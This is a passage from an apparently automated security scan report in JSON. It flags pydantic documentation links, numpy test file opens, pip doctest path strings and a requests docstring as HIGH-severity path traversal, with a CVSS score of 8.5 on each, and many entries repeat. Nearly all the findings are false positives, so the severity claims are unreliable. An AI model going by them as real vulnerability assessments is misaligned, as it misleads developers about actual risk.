            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 5582,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(tmp_filename, \"r+b\") as f:",
            "context": "        assert_array_equal(d, np.fromfile(tmp_filename))\n        # check offset\n        with open(tmp_filename, \"r+b\") as f:\n            f.seek(d.nbytes)\n            d.tofile(f)",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 5640,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(tmp_filename, 'r+b') as f:",
            "context": "            assert_equal(pos, 10 + 2 + 8, err_msg=err_msg)\n\n            with open(tmp_filename, 'r+b') as f:\n                f.read(2)\n                f.seek(0, 1)  # seek between read&write required by ANSI C",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/color.py",
            "line": 11,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [`pydantic-extra-types.Color`](../usage/types/extra_types/color_types.md)",
            "context": "Warning: Deprecated\n    The `Color` class is deprecated, use `pydantic_extra_types` instead.\n    See [`pydantic-extra-types.Color`](../usage/types/extra_types/color_types.md)\n    for more information.\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/color.py",
            "line": 11,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [`pydantic-extra-types.Color`](../usage/types/extra_types/color_types.md)",
            "context": "Warning: Deprecated\n    The `Color` class is deprecated, use `pydantic_extra_types` instead.\n    See [`pydantic-extra-types.Color`](../usage/types/extra_types/color_types.md)\n    for more information.\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/validate_call_decorator.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Validation Decorator](../concepts/validation_decorator.md)",
            "context": ") -> AnyCallableT | Callable[[AnyCallableT], AnyCallableT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Validation Decorator](../concepts/validation_decorator.md)\n\n    Returns a decorated wrapper around the function that validates the arguments and, optionally, the return value.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/validate_call_decorator.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Validation Decorator](../concepts/validation_decorator.md)",
            "context": ") -> AnyCallableT | Callable[[AnyCallableT], AnyCallableT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Validation Decorator](../concepts/validation_decorator.md)\n\n    Returns a decorated wrapper around the function that validates the arguments and, optionally, the return value.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 986,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Fields](../concepts/fields.md)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Fields](../concepts/fields.md)\n\n    Create a field for objects that can be configured.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 986,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Fields](../concepts/fields.md)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Fields](../concepts/fields.md)\n\n    Create a field for objects that can be configured.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1026,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Strict Mode](../concepts/strict_mode.md) for details.",
            "context": "        coerce_numbers_to_str: Whether to enable coercion of any `Number` type to `str` (not applicable in `strict` mode).\n        strict: If `True`, strict validation is applied to the field.\n            See [Strict Mode](../concepts/strict_mode.md) for details.\n        gt: Greater than. If set, value must be greater than this. Only applicable to numbers.\n        ge: Greater than or equal. If set, value must be greater than or equal to this. Only applicable to numbers.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1026,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Strict Mode](../concepts/strict_mode.md) for details.",
            "context": "        coerce_numbers_to_str: Whether to enable coercion of any `Number` type to `str` (not applicable in `strict` mode).\n        strict: If `True`, strict validation is applied to the field.\n            See [Strict Mode](../concepts/strict_mode.md) for details.\n        gt: Greater than. If set, value must be greater than this. Only applicable to numbers.\n        ge: Greater than or equal. If set, value must be greater than or equal to this. Only applicable to numbers.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1039,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Union Mode](../concepts/unions.md#union-modes) for details.",
            "context": "        decimal_places: Maximum number of decimal places allowed for numbers.\n        union_mode: The strategy to apply when validating a union. Can be `smart` (the default), or `left_to_right`.\n            See [Union Mode](../concepts/unions.md#union-modes) for details.\n        fail_fast: If `True`, validation will stop on the first error. If `False`, all validation errors will be collected.\n            This option can be applied only to iterable types (list, tuple, set, and frozenset).",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1039,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Union Mode](../concepts/unions.md#union-modes) for details.",
            "context": "        decimal_places: Maximum number of decimal places allowed for numbers.\n        union_mode: The strategy to apply when validating a union. Can be `smart` (the default), or `left_to_right`.\n            See [Union Mode](../concepts/unions.md#union-modes) for details.\n        fail_fast: If `True`, validation will stop on the first error. If `False`, all validation errors will be collected.\n            This option can be applied only to iterable types (list, tuple, set, and frozenset).",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1248,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Private Model Attributes](../concepts/models.md#private-model-attributes)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Private Model Attributes](../concepts/models.md#private-model-attributes)\n\n    Indicates that an attribute is intended for private use and not handled during normal validation/serialization.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1248,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Private Model Attributes](../concepts/models.md#private-model-attributes)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Private Model Attributes](../concepts/models.md#private-model-attributes)\n\n    Indicates that an attribute is intended for private use and not handled during normal validation/serialization.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[The `computed_field` decorator](../concepts/fields.md#the-computed_field-decorator)",
            "context": ") -> PropertyT | typing.Callable[[PropertyT], PropertyT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [The `computed_field` decorator](../concepts/fields.md#the-computed_field-decorator)\n\n    Decorator to include `property` and `cached_property` when serializing models or dataclasses.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/fields.py",
            "line": 1374,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[The `computed_field` decorator](../concepts/fields.md#the-computed_field-decorator)",
            "context": ") -> PropertyT | typing.Callable[[PropertyT], PropertyT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [The `computed_field` decorator](../concepts/fields.md#the-computed_field-decorator)\n\n    Decorator to include `property` and `cached_property` when serializing models or dataclasses.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_serializers.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.",
            "context": "    ```\n\n    See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.\n\n    Four signatures are supported:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_serializers.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.",
            "context": "    ```\n\n    See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.\n\n    Four signatures are supported:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_serializers.py",
            "line": 394,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.",
            "context": "    - `(self, nxt: SerializerFunctionWrapHandler, info: SerializationInfo)`\n\n        See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_serializers.py",
            "line": 394,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.",
            "context": "    - `(self, nxt: SerializerFunctionWrapHandler, info: SerializationInfo)`\n\n        See [Custom serializers](../concepts/serialization.md#custom-serializers) for more information.\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 18,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)",
            "context": "class AliasPath:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)\n\n    A data class used by `validation_alias` as a convenience to create aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 18,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)",
            "context": "class AliasPath:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)\n\n    A data class used by `validation_alias` as a convenience to create aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)",
            "context": "class AliasChoices:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)\n\n    A data class used by `validation_alias` as a convenience to create aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)",
            "context": "class AliasChoices:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`AliasPath` and `AliasChoices`](../concepts/alias.md#aliaspath-and-aliaschoices)\n\n    A data class used by `validation_alias` as a convenience to create aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Using an `AliasGenerator`](../concepts/alias.md#using-an-aliasgenerator)",
            "context": "class AliasGenerator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Using an `AliasGenerator`](../concepts/alias.md#using-an-aliasgenerator)\n\n    A data class used by `alias_generator` as a convenience to create various aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Using an `AliasGenerator`](../concepts/alias.md#using-an-aliasgenerator)",
            "context": "class AliasGenerator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Using an `AliasGenerator`](../concepts/alias.md#using-an-aliasgenerator)\n\n    A data class used by `alias_generator` as a convenience to create various aliases.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *after* validators](../concepts/validators.md#field-after-validator)",
            "context": "class AfterValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *after* validators](../concepts/validators.md#field-after-validator)\n\n    A metadata class that indicates that a validation should be applied **after** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 30,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *after* validators](../concepts/validators.md#field-after-validator)",
            "context": "class AfterValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *after* validators](../concepts/validators.md#field-after-validator)\n\n    A metadata class that indicates that a validation should be applied **after** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *before* validators](../concepts/validators.md#field-before-validator)",
            "context": "class BeforeValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *before* validators](../concepts/validators.md#field-before-validator)\n\n    A metadata class that indicates that a validation should be applied **before** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *before* validators](../concepts/validators.md#field-before-validator)",
            "context": "class BeforeValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *before* validators](../concepts/validators.md#field-before-validator)\n\n    A metadata class that indicates that a validation should be applied **before** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *plain* validators](../concepts/validators.md#field-plain-validator)",
            "context": "class PlainValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *plain* validators](../concepts/validators.md#field-plain-validator)\n\n    A metadata class that indicates that a validation should be applied **instead** of the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *plain* validators](../concepts/validators.md#field-plain-validator)",
            "context": "class PlainValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *plain* validators](../concepts/validators.md#field-plain-validator)\n\n    A metadata class that indicates that a validation should be applied **instead** of the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 256,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *wrap* validators](../concepts/validators.md#field-wrap-validator)",
            "context": "class WrapValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *wrap* validators](../concepts/validators.md#field-wrap-validator)\n\n    A metadata class that indicates that a validation should be applied **around** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 256,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field *wrap* validators](../concepts/validators.md#field-wrap-validator)",
            "context": "class WrapValidator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field *wrap* validators](../concepts/validators.md#field-wrap-validator)\n\n    A metadata class that indicates that a validation should be applied **around** the inner validation logic.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 416,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field validators](../concepts/validators.md#field-validators)",
            "context": ") -> Callable[[Any], Any]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field validators](../concepts/validators.md#field-validators)\n\n    Decorate methods on the class indicating that they should be used to validate fields.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 416,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[field validators](../concepts/validators.md#field-validators)",
            "context": ") -> Callable[[Any], Any]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [field validators](../concepts/validators.md#field-validators)\n\n    Decorate methods on the class indicating that they should be used to validate fields.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 454,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "For more in depth examples, see [Field Validators](../concepts/validators.md#field-validators).",
            "context": "    ```\n\n    For more in depth examples, see [Field Validators](../concepts/validators.md#field-validators).\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 454,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "For more in depth examples, see [Field Validators](../concepts/validators.md#field-validators).",
            "context": "    ```\n\n    For more in depth examples, see [Field Validators](../concepts/validators.md#field-validators).\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 674,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Model Validators](../concepts/validators.md#model-validators)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Model Validators](../concepts/validators.md#model-validators)\n\n    Decorate model methods for validation purposes.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 674,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Model Validators](../concepts/validators.md#model-validators)",
            "context": ") -> Any:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Model Validators](../concepts/validators.md#model-validators)\n\n    Decorate model methods for validation purposes.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 708,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "For more in depth examples, see [Model Validators](../concepts/validators.md#model-validators).",
            "context": "    ```\n\n    For more in depth examples, see [Model Validators](../concepts/validators.md#model-validators).\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
            "line": 708,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "For more in depth examples, see [Model Validators](../concepts/validators.md#model-validators).",
            "context": "    ```\n\n    For more in depth examples, see [Model Validators](../concepts/validators.md#model-validators).\n\n    Args:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/root_model.py",
            "line": 37,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`RootModel` and Custom Root Types](../concepts/models.md#rootmodel-and-custom-root-types)",
            "context": "class RootModel(BaseModel, typing.Generic[RootModelRootType], metaclass=_RootModelMetaclass):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`RootModel` and Custom Root Types](../concepts/models.md#rootmodel-and-custom-root-types)\n\n    A Pydantic `BaseModel` for the root object of the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/root_model.py",
            "line": 37,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`RootModel` and Custom Root Types](../concepts/models.md#rootmodel-and-custom-root-types)",
            "context": "class RootModel(BaseModel, typing.Generic[RootModelRootType], metaclass=_RootModelMetaclass):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`RootModel` and Custom Root Types](../concepts/models.md#rootmodel-and-custom-root-types)\n\n    A Pydantic `BaseModel` for the root object of the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 2,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Schema](../concepts/json_schema.md)",
            "context": "\"\"\"!!! abstract \"Usage Documentation\"\n    [JSON Schema](../concepts/json_schema.md)\n\nThe `json_schema` module contains classes and functions to allow the way [JSON Schema](https://json-schema.org/)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 2,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Schema](../concepts/json_schema.md)",
            "context": "\"\"\"!!! abstract \"Usage Documentation\"\n    [JSON Schema](../concepts/json_schema.md)\n\nThe `json_schema` module contains classes and functions to allow the way [JSON Schema](https://json-schema.org/)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Customizing the JSON Schema Generation Process](../concepts/json_schema.md#customizing-the-json-schema-generation-process)",
            "context": "class GenerateJsonSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Customizing the JSON Schema Generation Process](../concepts/json_schema.md#customizing-the-json-schema-generation-process)\n\n    A class for generating JSON schemas.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Customizing the JSON Schema Generation Process](../concepts/json_schema.md#customizing-the-json-schema-generation-process)",
            "context": "class GenerateJsonSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Customizing the JSON Schema Generation Process](../concepts/json_schema.md#customizing-the-json-schema-generation-process)\n\n    A class for generating JSON schemas.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 2488,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`WithJsonSchema` Annotation](../concepts/json_schema.md#withjsonschema-annotation)",
            "context": "class WithJsonSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`WithJsonSchema` Annotation](../concepts/json_schema.md#withjsonschema-annotation)\n\n    Add this as an annotation on a field to override the (base) JSON schema that would be generated for that field.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
